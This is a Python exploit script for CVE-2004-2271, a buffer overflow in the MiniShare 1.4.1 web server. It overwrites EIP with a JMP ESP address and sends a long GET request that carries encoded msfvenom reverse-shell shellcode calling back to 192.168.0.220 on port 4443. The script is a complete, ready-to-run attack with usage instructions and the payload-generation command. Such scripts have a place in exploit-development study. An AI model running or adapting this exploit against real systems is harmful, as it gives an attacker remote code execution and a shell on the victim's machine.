#!/usr/bin/python

# CVE: CVE-2004-2271 (https://nvd.nist.gov/vuln/detail/CVE-2004-2271/)
# Method: EIP override with JMP ESP
# Author: werebug (https://werebug.com)
# Tested on: Windows 7 Enterprise SP 1
# Software: MiniShare 1.4.1

import socket
import sys

if len(sys.argv) < 2:
    print "Usage: ./minishare-1.4.1-GET.py <host>"
    sys.exit(1)

count = 5000
eip_off = 1787

# \x00 \x0d
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.220 LPORT=4443 EXITFUNC=thread -f c -b "\x00\x0d" -e x86/shikata_ga_nai
shellcode = ("\xdb\xd3\xd9\x74\x24\xf4\xba\x71\xab\x6a\x12\x5d\x31\xc9\xb1"
"\x52\x31\x55\x17\x03\x55\x17\x83\x9c\x57\x88\xe7\xa2\x40\xcf"
"\x08\x5a\x91\xb0\x81\xbf\xa0\xf0\xf6\xb4\x93\xc0\x7d\x98\x1f"
"\xaa\xd0\x08\xab\xde\xfc\x3f\x1c\x54\xdb\x0e\x9d\xc5\x1f\x11"
"\x1d\x14\x4c\xf1\x1c\xd7\x81\xf0\x59\x0a\x6b\xa0\x32\x40\xde"
"\x54\x36\x1c\xe3\xdf\x04\xb0\x63\x3c\xdc\xb3\x42\x93\x56\xea"
"\x44\x12\xba\x86\xcc\x0c\xdf\xa3\x87\xa7\x2b\x5f\x16\x61\x62"
"\xa0\xb5\x4c\x4a\x53\xc7\x89\x6d\x8c\xb2\xe3\x8d\x31\xc5\x30"
"\xef\xed\x40\xa2\x57\x65\xf2\x0e\x69\xaa\x65\xc5\x65\x07\xe1"
"\x81\x69\x96\x26\xba\x96\x13\xc9\x6c\x1f\x67\xee\xa8\x7b\x33"
"\x8f\xe9\x21\x92\xb0\xe9\x89\x4b\x15\x62\x27\x9f\x24\x29\x20"
"\x6c\x05\xd1\xb0\xfa\x1e\xa2\x82\xa5\xb4\x2c\xaf\x2e\x13\xab"
"\xd0\x04\xe3\x23\x2f\xa7\x14\x6a\xf4\xf3\x44\x04\xdd\x7b\x0f"
"\xd4\xe2\xa9\x80\x84\x4c\x02\x61\x74\x2d\xf2\x09\x9e\xa2\x2d"
"\x29\xa1\x68\x46\xc0\x58\xfb\xa9\xbd\x62\x27\x41\xbc\x62\xc6"
"\xc9\x49\x84\x82\xfd\x1f\x1f\x3b\x67\x3a\xeb\xda\x68\x90\x96"
"\xdd\xe3\x17\x67\x93\x03\x5d\x7b\x44\xe4\x28\x21\xc3\xfb\x86"
"\x4d\x8f\x6e\x4d\x8d\xc6\x92\xda\xda\x8f\x65\x13\x8e\x3d\xdf"
"\x8d\xac\xbf\xb9\xf6\x74\x64\x7a\xf8\x75\xe9\xc6\xde\x65\x37"
"\xc6\x5a\xd1\xe7\x91\x34\x8f\x41\x48\xf7\x79\x18\x27\x51\xed"
"\xdd\x0b\x62\x6b\xe2\x41\x14\x93\x53\x3c\x61\xac\x5c\xa8\x65"
"\xd5\x80\x48\x89\x0c\x01\x68\x68\x84\x7c\x01\x35\x4d\x3d\x4c"
"\xc6\xb8\x02\x69\x45\x48\xfb\x8e\x55\x39\xfe\xcb\xd1\xd2\x72"
"\x43\xb4\xd4\x21\x64\x9d")

# JMP ESP 767F4E2B
jmpesp = "\x2b\x4e\x7f\x76"

ipadding = "A" * 1787
nop = "\x90" * 12

fpadding = "C" * (count - 4 - 1787 - 12 - len(shellcode))

buffer = ipadding + jmpesp + nop + shellcode + fpadding

print "Sending 5000 byte GET request."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((sys.argv[1] , 80))
s.send('GET ' + buffer + ' HTTP/1.1\r\n\r\n')
s.close()
